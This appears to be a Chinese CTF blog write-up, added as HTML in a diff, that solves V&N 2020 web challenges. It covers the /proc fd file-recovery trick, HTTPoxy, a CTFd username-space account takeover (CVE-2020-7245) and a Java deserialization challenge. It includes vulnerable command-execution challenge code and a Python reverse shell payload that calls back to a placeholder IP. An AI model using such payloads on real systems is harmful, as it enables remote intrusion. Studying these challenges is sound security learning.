@@ -1,0 +1,1149 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="v&amp;n 2020   （环境不好弄，看看别人的题解）https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6407.html CHECKINfrom flask import Flask, request import os app &#x3D; Flask(__name__)   flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;) # flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="已发生的比赛刷题">
+<meta property="og:url" content="https://zer0peach.github.io/2023/10/23/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="v&amp;n 2020   （环境不好弄，看看别人的题解）https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6407.html CHECKINfrom flask import Flask, request import os app &#x3D; Flask(__name__)   flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;) # flag">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023171623345.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172600164.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172615615.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172954085.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023173050175.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174907255.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174517818.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174526872.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174539645.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174556692.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182241410.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182443294.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182457651.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182557807.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182813275.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182852817.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205141419.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205230889.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205349780.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205523512.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205537572.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205556752.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205746871.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212419041.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212430993.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212457530.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212544665.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023200739259.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023224558055.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225409500.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225646835.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225843143.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172058873.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172410335.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172251893.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172518027.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172750973.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172948143.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024173115630.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203239673.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203704327.png">
+<meta property="article:published_time" content="2023-10-23T09:10:32.000Z">
+<meta property="article:modified_time" content="2023-10-26T10:08:50.066Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023171623345.png">
+  
+  
+  
+  <title>已发生的比赛刷题 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="已发生的比赛刷题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-23 17:10" pubdate>
+          2023年10月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          140 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">已发生的比赛刷题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="v-n-2020-（环境不好弄，看看别人的题解）"><a href="#v-n-2020-（环境不好弄，看看别人的题解）" class="headerlink" title="v&amp;n 2020   （环境不好弄，看看别人的题解）"></a>v&amp;n 2020   （环境不好弄，看看别人的题解）</h1><p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6407.html">https://www.zhaoj.in/read-6407.html</a></p>
+<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+<span class="hljs-keyword">import</span> os
+app = Flask(__name__)
+ 
+flag_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)
+<span class="hljs-comment"># flag = flag_file.read()</span>
+<span class="hljs-comment"># flag_file.close()</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># @app.route(&#x27;/flag&#x27;)</span>
+<span class="hljs-comment"># def flag():</span>
+<span class="hljs-comment">#     return flag</span>
+<span class="hljs-comment">## want flag? naive!</span>
+ 
+<span class="hljs-comment"># You will never find the thing you want:) I think</span>
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shell&#x27;</span></span>)  </span><span class="hljs-comment">#shell可以执行系统命令</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">shell</span>():
+    os.system(<span class="hljs-string">&quot;rm -f flag.txt&quot;</span>)  <span class="hljs-comment"># 执行shell函数时会删除flag文件</span>
+    exec_cmd = request.args.get(<span class="hljs-string">&#x27;c&#x27;</span>)  <span class="hljs-comment"># 利用参数c来写入系统命令</span>
+    os.system(exec_cmd)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>
+ 
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()
+ 
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre></div>
+
+<p>程序在最开始打开了 <code>flag </code>文件，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用<code>rm -f flag.txt</code>）删除之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 fd 文件描述符目录下还是会有这个文件的 <code>fd</code>，通过这个我们即可得到被删除文件的内容。</p>
+<p>简而言之就是没有关闭文件，能通过&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;xxxx  来查看被删除的文件内容</p>
+<p><code>/proc/[pid]/fd </code>这个目录里包含了进程打开文件的情况,pid就是进程记录的打开文件的序号.</p>
+<div class="code-wrapper"><pre><code class="hljs livecodeserver">/<span class="hljs-built_in">shell</span>?c=python3%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>import%<span class="hljs-number">20</span><span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;你的ip&quot;</span>,<span class="hljs-number">8089</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);%<span class="hljs-number">27</span></code></pre></div>
+
+<p>python反弹shell</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023171623345.png" srcset="/img/loading.gif" lazyload alt="image-20231023171623345"></p>
+<h3 id="小附带一个知识"><a href="#小附带一个知识" class="headerlink" title="小附带一个知识"></a>小附带一个知识</h3><div class="code-wrapper"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$rmf</span> = function($file)&#123;</span>
+    <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;rm -f -- &#x27;</span>.escapeshellarg(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>));
+&#125;;</code></pre></div>
+
+<p>PHP 调用 <code>system</code> 的时候会启用一个新进程，而该进程的 <code>cmdline</code> 则正是由 <code>rm -f --</code> 在 sh 中构成的符合 <code>\0</code> 格式标准的字符串</p>
+<p><code>/proc/sys/kernel/ns_last_pid</code>      这个文件会记录最近一次进程使用的 PID</p>
+<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>版本php：<strong>5.6.23</strong>     （关键）</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/vendor/autoload.php&#x27;</span>;
+ 
+<span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;
+ 
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+ 
+<span class="hljs-comment">//若返回内容中有success即可读取flag</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;
+    <span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();
+    <span class="hljs-variable">$response</span> = <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);
+    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>();
+    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">TRUE</span>);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;success&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;    
+      <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);
+    &#125;
+&#125;
+ <span class="hljs-comment">//查看文件内容</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);
+&#125;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>])) &#123;
+    <span class="hljs-title function_ invoke__">phpinfo</span>();
+&#125;</code></pre></div>
+
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172600164.png" srcset="/img/loading.gif" lazyload alt="image-20231023172600164"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172615615.png" srcset="/img/loading.gif" lazyload alt="image-20231023172615615"></p>
+<h3 id="解法-HTTPoxy漏洞"><a href="#解法-HTTPoxy漏洞" class="headerlink" title="解法 HTTPoxy漏洞"></a>解法 HTTPoxy漏洞</h3><p>所有以CGI或Fastcgi运行的程序理论上都受到影响</p>
+<p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上<code>HTTP_</code> 前缀， 注册为环境变量, 所以如果你在Header中发送一个<code>Proxy:xxxxxx</code>, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“<code>HTTP_PROXY</code>“)就变成可被控制的了</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023172954085.png" srcset="/img/loading.gif" lazyload alt="image-20231023172954085"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023173050175.png" srcset="/img/loading.gif" lazyload alt="image-20231023173050175"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174907255.png" srcset="/img/loading.gif" lazyload alt="image-20231023174907255"></p>
+<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p><strong>CVE-2020-7245</strong></p>
+<p>当时ctfd的1day漏洞</p>
+<p>通过分析他是如何修复的，逆向思考出利用方法</p>
+<p>前在验证的时候没有把用户名两头的空格给去掉，直接使用拿到的参数进行比较</p>
+<p>在保存的时候，却是保存的去掉空格之后的数据。  name &#x3D; name.strip()</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>注册 ”空格+管理员“</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174517818.png" srcset="/img/loading.gif" lazyload alt="image-20231023174517818"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174526872.png" srcset="/img/loading.gif" lazyload alt="image-20231023174526872"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174539645.png" srcset="/img/loading.gif" lazyload alt="image-20231023174539645"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023174556692.png" srcset="/img/loading.gif" lazyload alt="image-20231023174556692"></p>
+<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>。。。自己先大致看了一遍，但要是细看的话很多地方没看懂，也漏看了关键部分</p>
+<p>ClentInfoFilter 类，用于从 cookie 里进行反序列化的拦截器。</p>
+<p>第一次访问时会序列化一个新的 ClientInfo 对象，用户名 Anonymous 用户组 normal，然后 base64 之后存入 cinfo cookie。再次访问时利用这个 cookie 反序列化为之前的对象。</p>
+<p>然后来看看 Controller 代码逻辑，需要用户名为 admin 用户组为 webmanager。</p>
+<p>然后自己伪造</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182241410.png" srcset="/img/loading.gif" lazyload alt="image-20231023182241410"></p>
+<p>有了admin的身份后，尝试读取文件和文件上传是否存在漏洞</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182443294.png" srcset="/img/loading.gif" lazyload alt="image-20231023182443294"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182457651.png" srcset="/img/loading.gif" lazyload alt="image-20231023182457651"></p>
+<p>答案是权限不足</p>
+<p>那么继续来看最后一个漏洞点，就是不反序列化 ClientInfo 了，尝试反序列化 Tools 类，其中有一个命令执行点。</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182557807.png" srcset="/img/loading.gif" lazyload alt="image-20231023182557807"></p>
+<p>如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将<strong>调用默认的</strong>方法来根据目标类中的属性来进行序列化和反序列化</p>
